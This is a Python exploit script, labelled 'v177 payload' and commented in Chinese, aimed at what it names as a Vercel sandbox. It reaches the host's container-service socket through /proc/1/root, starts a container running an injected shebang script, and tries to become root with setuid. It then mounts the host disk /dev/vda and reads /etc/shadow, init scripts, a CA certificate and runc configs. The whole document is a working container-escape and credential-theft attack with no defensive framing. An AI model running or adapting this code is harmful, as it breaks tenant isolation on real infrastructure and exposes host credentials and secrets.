# -*- coding: utf-8 -*-
"""v177 payload: shebang 脚本注入 Create command → 容器内任意代码执行 → setuid + mount /dev/vda
输出 /vercel/sandbox/v177c.out"""
import socket, struct, time, json, os, signal, re, subprocess, stat

OUT = '/vercel/sandbox/v177c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(275)

R = '/proc/1/root'
CELL = R + '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'
PWN = '/vercel/sandbox/pwn177.py'
PWNOUT = '/vercel/sandbox/pwn177_out.txt'


def log(s, maxlen=450):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def raw_req(sockpath, path, body, t=5.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return st, d[hdr_end + 4:hdr_end + 4 + 1000] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


# ============ 1: 写 shebang 脚本到沙箱盘 ============
log('=== 1 write pwn ===')
PWN_CODE = '''#!/usr/bin/python3
import os, sys
OUT = '/vercel/sandbox/pwn177_out.txt'
def w(s):
    try:
        with open(OUT, 'a') as ff:
            ff.write(str(s) + '\\n')
    except Exception as e:
        pass
w('START pid=%d uid=%d gid=%d' % (os.getpid(), os.getuid(), os.getgid()))
w('CAPS eff: ' + open('/proc/self/status').read().split('CapEff:')[1].split('\\n')[0].strip())
try:
    os.setgid(0)
    os.setuid(0)
    w('ROOTED uid=%d gid=%d' % (os.getuid(), os.getgid()))
except Exception as e:
    w('SETUID EXC %s' % e)
try:
    os.makedirs('/mnt', exist_ok=True)
    r = os.system('mount /dev/vda /mnt 2>&1')
    w('MOUNT rc=%d' % r)
except Exception as e:
    w('MOUNT EXC %s' % e)
try:
    d = open('/mnt/etc/shadow', 'rb').read()
    w('SHADOW (%d): %r' % (len(d), d[:400]))
except Exception as e:
    w('SHADOW EXC %s' % e)
try:
    d = open('/mnt/opt/vercel/celld-init.sh', 'rb').read()
    w('CELLD-INIT (%d): %r' % (len(d), d[:600]))
except Exception as e:
    w('CELLD-INIT EXC %s' % e)
try:
    lst = os.listdir('/mnt')
    w('MNT ROOT: %r' % lst[:30])
except Exception as e:
    w('MNT ROOT EXC %s' % e)
w('PWN_DONE')
'''
try:
    open(PWN, 'w').write(PWN_CODE)
    os.chmod(PWN, 0o755)
    log('pwn written +x size=%d' % os.path.getsize(PWN))
    # 检查宿主视角是否可见 (同一块盘)
    log('host sees pwn: %s' % os.path.exists(PWN))
except Exception as e:
    log('PWN WRITE EXC %s' % e)

# ============ 2: Create command=脚本 ============
log('=== 2 create ===')
st, pay = raw_req(CELL, '%s/Create' % CTRS,
                  json.dumps({'drive_id': 'sandbox', 'command': PWN}).encode(), t=8)
log('Create pwn -> %s %r' % (st, pay[:200]))
m = re.search(rb'containerId["\s:]+([A-Za-z0-9_-]+)', pay)
cid = m.group(1).decode() if m else ''
log('cid=%s' % cid)
if cid:
    st2, pay2 = raw_req(CELL, '%s/Start' % CTRS, json.dumps({'container_id': cid}).encode(), t=8)
    log('Start -> %s %r' % (st2, pay2[:150]))

# ============ 3: 轮询输出 ============
log('=== 3 poll ===')
t0 = time.time()
seen = ''
while time.time() - t0 < 25:
    time.sleep(0.5)
    try:
        if os.path.exists(PWNOUT):
            cur = open(PWNOUT, errors='replace').read()
            if cur != seen:
                log('--- pwn out +%d ---\n%s' % (len(cur) - len(seen), cur[len(seen):]))
                seen = cur
            if 'PWN_DONE' in cur:
                break
    except Exception as e:
        log('POLL EXC %s' % e)
log('poll end seen_len=%d' % len(seen))

# ============ 4: 检查容器进程 ============
log('=== 4 proc ===')
try:
    for d in sorted(os.listdir('/proc')):
        if not d.isdigit():
            continue
        try:
            cmd = open('/proc/%s/cmdline' % d).read().replace('\x00', ' ')[:100]
        except Exception:
            continue
        if 'pwn177' in cmd or 'python3' in cmd:
            log('P %s: %s' % (d, cmd))
except Exception as e:
    log('PROC EXC %s' % e)

# ============ 5: 宿主文件补读 (去换行输出) ============
log('=== 5 host files ===')
for p in ['/proc/1/root/opt/vercel/celld-init.sh',
          '/proc/1/root/var/run/cell/ca-cert.pem']:
    try:
        data = open(p, 'rb').read()
        log('FILE %s (%d) %r' % (p, len(data), data[:1200]))
    except Exception as e:
        log('FILE %s EXC %s' % (p, e))
# runc config.json
try:
    base = R + '/var/run/cell/runc'
    for d in sorted(os.listdir(base)):
        cfg = os.path.join(base, d, 'config.json')
        if os.path.exists(cfg):
            data = open(cfg, 'rb').read()
            log('RUNCCFG %s (%d) %r' % (d, len(data), data[:3000]))
            break
except Exception as e:
    log('RUNCCFG EXC %s' % e)

# ============ 6: 完整方法列表 (分段) ============
log('=== 6 methods ===')
try:
    data = open(R + '/opt/vercel/celld', 'rb').read()
    pats = re.findall(rb'vercel\.hive\.cell\.api\.containers\.v1\.ContainersService/[A-Za-z]+', data)
    uniq = []
    for p in pats:
        s = p.decode(errors='replace')
        if s not in uniq:
            uniq.append(s)
    log('METHODS(%d): %s' % (len(uniq), ' '.join(uniq)))
except Exception as e:
    log('METHODS EXC %s' % e)

log('V177_DONE')
f.close()
